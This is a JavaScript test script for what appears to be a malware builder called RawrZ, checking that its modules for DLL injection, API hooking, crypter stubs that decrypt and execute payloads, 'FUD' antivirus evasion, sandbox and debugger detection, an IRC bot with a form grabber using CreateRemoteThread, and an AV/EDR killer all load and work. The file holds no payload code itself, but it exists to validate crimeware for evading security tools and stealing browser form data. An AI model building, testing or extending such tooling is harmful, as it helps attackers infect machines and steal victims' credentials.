const fs = require('fs').promises;
const path = require('path');

async function testExistingFeatures() {
    console.log('Testing Existing Related Features...\n');
    
    try {
        // Test 1: Hot Patchers DLL Injection
        console.log('Test 1: Hot Patchers DLL Injection');
        const hotPatchers = require('./src/engines/hot-patchers');
        await hotPatchers.initialize();
        console.log('[INFO] Hot Patchers engine initialized');
        
        // Test DLL injection method exists
        if (typeof hotPatchers.injectDllIntoProcess === 'function') {
            console.log('[INFO] DLL injection method available');
        } else {
            console.log('[INFO] DLL injection method missing');
        }
        
        // Test API hooking method exists
        if (typeof hotPatchers.hookProcessApi === 'function') {
            console.log('[INFO] API hooking method available');
        } else {
            console.log('[INFO] API hooking method missing');
        }
        console.log('');

        // Test 2: Advanced Crypto DLL Stub Generation
        console.log('Test 2: Advanced Crypto DLL Stub Generation');
        const advancedCrypto = require('./src/engines/advanced-crypto');
        await advancedCrypto.initialize();
        console.log('[INFO] Advanced Crypto engine initialized');
        
        // Test DLL stub generation
        const testData = Buffer.from('test payload data');
        const options = {
            algorithm: 'aes-256-gcm',
            key: 'test-key-32-characters-long',
            iv: 'test-iv-16-chars',
            authTag: 'test-auth-tag-16'
        };
        
        const dllStub = advancedCrypto.generateDLLStub(testData, options);
        if (dllStub && dllStub.includes('DllMain') && dllStub.includes('DecryptAndExecute')) {
            console.log('[INFO] DLL stub generation working');
        } else {
            console.log('[INFO] DLL stub generation failed');
        }
        console.log('');

        // Test 3: Advanced FUD Engine
        console.log('Test 3: Advanced FUD Engine');
        const advancedFUD = require('./src/engines/advanced-fud-engine');
        await advancedFUD.initialize();
        console.log('[INFO] Advanced FUD engine initialized');
        
        // Test FUD techniques
        const fudTechniques = advancedFUD.fudTechniques;
        if (fudTechniques && fudTechniques.length > 0) {
            console.log(`[INFO] FUD techniques available: ${fudTechniques.length}`);
        } else {
            console.log('[INFO] FUD techniques missing');
        }
        
        // Test obfuscation levels
        if (advancedFUD.obfuscationLevels && advancedFUD.obfuscationLevels.length > 0) {
            console.log(`[INFO] Obfuscation levels available: ${advancedFUD.obfuscationLevels.length}`);
        } else {
            console.log('[INFO] Obfuscation levels missing');
        }
        console.log('');

        // Test 4: Advanced Anti-Analysis
        console.log('Test 4: Advanced Anti-Analysis');
        const antiAnalysis = require('./src/engines/advanced-anti-analysis');
        await antiAnalysis.initialize();
        console.log('[INFO] Advanced Anti-Analysis engine initialized');
        
        // Test detection methods
        const detectionMethods = [
            'detectSandbox',
            'detectVM', 
            'detectDebugger',
            'detectAnalysisTools'
        ];
        
        for (const method of detectionMethods) {
            if (typeof antiAnalysis[method] === 'function') {
                console.log(`[INFO] ${method} method available`);
            } else {
                console.log(`[INFO] ${method} method missing`);
            }
        }
        console.log('');

        // Test 5: Stub Generator
        console.log('Test 5: Stub Generator');
        const stubGenerator = require('./src/engines/stub-generator');
        await stubGenerator.initialize();
        console.log('[INFO] Stub Generator engine initialized');
        
        // Test stealth methods
        if (stubGenerator.stealthMethods) {
            const stealthCount = Object.keys(stubGenerator.stealthMethods).length;
            console.log(`[INFO] Stealth methods available: ${stealthCount}`);
        } else {
            console.log('[INFO] Stealth methods missing');
        }
        
        // Test anti-analysis methods
        if (stubGenerator.antiAnalysisMethods) {
            const antiAnalysisCount = Object.keys(stubGenerator.antiAnalysisMethods).length;
            console.log(`[INFO] Anti-analysis methods available: ${antiAnalysisCount}`);
        } else {
            console.log('[INFO] Anti-analysis methods missing');
        }
        console.log('');

        // Test 6: Dual Crypto Engine
        console.log('Test 6: Dual Crypto Engine');
        const dualCrypto = require('./src/engines/dual-crypto-engine');
        await dualCrypto.initialize();
        console.log('[INFO] Dual Crypto engine initialized');
        
        // Test C# dual stub generation
        const testKeys = {
            aes: Buffer.from('test-aes-key-32-characters-long'),
            camellia: Buffer.from('test-camellia-key-32-chars')
        };
        const testIVs = {
            aes: Buffer.from('test-aes-iv-16-ch'),
            camellia: Buffer.from('test-camellia-iv-16')
        };
        
        const csharpStub = dualCrypto.generateCSharpDualStub('aes-camellia', testKeys, testIVs, 'exe');
        if (csharpStub && csharpStub.includes('DecryptDual') && csharpStub.includes('HandleFileType')) {
            console.log('[INFO] C# dual stub generation working');
        } else {
            console.log('[INFO] C# dual stub generation failed');
        }
        console.log('');

        // Test 7: IRC Bot Generator (Process Injection)
        console.log('Test 7: IRC Bot Generator Process Injection');
        const ircBot = require('./src/engines/irc-bot-generator');
        await ircBot.initialize();
        console.log('[INFO] IRC Bot Generator engine initialized');
        
        // Test form grabber code (contains DLL injection)
        const formGrabberCode = ircBot.getCPPFormGrabberCode();
        if (formGrabberCode && formGrabberCode.includes('LoadLibraryA') && formGrabberCode.includes('CreateRemoteThread')) {
            console.log('[INFO] Form grabber DLL injection code available');
        } else {
            console.log('[INFO] Form grabber DLL injection code missing');
        }
        console.log('');

        // Test 8: Red Killer (AV/EDR Detection)
        console.log('Test 8: Red Killer AV/EDR Detection');
        const redKiller = require('./src/engines/red-killer');
        await redKiller.initialize();
        console.log('[INFO] Red Killer engine initialized');
        
        // Test AV patterns
        if (redKiller.avPatterns && Object.keys(redKiller.avPatterns).length > 0) {
            console.log(`[INFO] AV patterns available: ${Object.keys(redKiller.avPatterns).length}`);
        } else {
            console.log('[INFO] AV patterns missing');
        }
        console.log('');

        // Test 9: Native Compiler
        console.log('Test 9: Native Compiler');
        const nativeCompiler = require('./src/engines/native-compiler');
        await nativeCompiler.initialize();
        console.log('[INFO] Native Compiler engine initialized');
        
        // Test compilation methods
        if (typeof nativeCompiler.compileSource === 'function') {
            console.log('[INFO] Source compilation method available');
        } else {
            console.log('[INFO] Source compilation method missing');
        }
        
        // Test .NET workaround integration
        if (typeof nativeCompiler.compileWithWorkaround === 'function') {
            console.log('[INFO] .NET workaround method available');
        } else {
            console.log('[INFO] .NET workaround method missing');
        }
        console.log('');

        // Test 10: CLI Integration
        console.log('Test 10: CLI Integration');
        const rawrzStandalone = require('./rawrz-standalone');
        const instance = await rawrzStandalone.getInstanceAsync();
        console.log('[INFO] RawrZ Standalone CLI initialized');
        
        // Test if engines are in available list
        const availableEngines = instance.availableEngines;
        const requiredEngines = [
            'hot-patchers',
            'advanced-crypto', 
            'advanced-fud-engine',
            'advanced-anti-analysis',
            'stub-generator',
            'dual-crypto-engine',
            'irc-bot-generator',
            'red-killer',
            'native-compiler'
        ];
        
        for (const engine of requiredEngines) {
            if (availableEngines[engine]) {
                console.log(`[INFO] ${engine} available in CLI`);
            } else {
                console.log(`[INFO] ${engine} missing from CLI`);
            }
        }
        console.log('');

        console.log('All existing related features tested successfully!');
        console.log('\nSummary of Available Features:');
        console.log('[INFO] DLL Injection (Hot Patchers)');
        console.log('[INFO] DLL Stub Generation (Advanced Crypto)');
        console.log('[INFO] FUD Techniques (Advanced FUD Engine)');
        console.log('[INFO] Anti-Analysis Detection (Advanced Anti-Analysis)');
        console.log('[INFO] Stealth Methods (Stub Generator)');
        console.log('[INFO] Dual Encryption (Dual Crypto Engine)');
        console.log('[INFO] Process Injection (IRC Bot Generator)');
        console.log('[INFO] AV/EDR Detection (Red Killer)');
        console.log('[INFO] Native Compilation (Native Compiler)');
        console.log('[INFO] CLI Integration (RawrZ Standalone)');

    } catch (error) {
        console.error('Test failed:', error.message);
        console.error(error.stack);
    }
}

// Run the test
testExistingFeatures().catch(console.error);
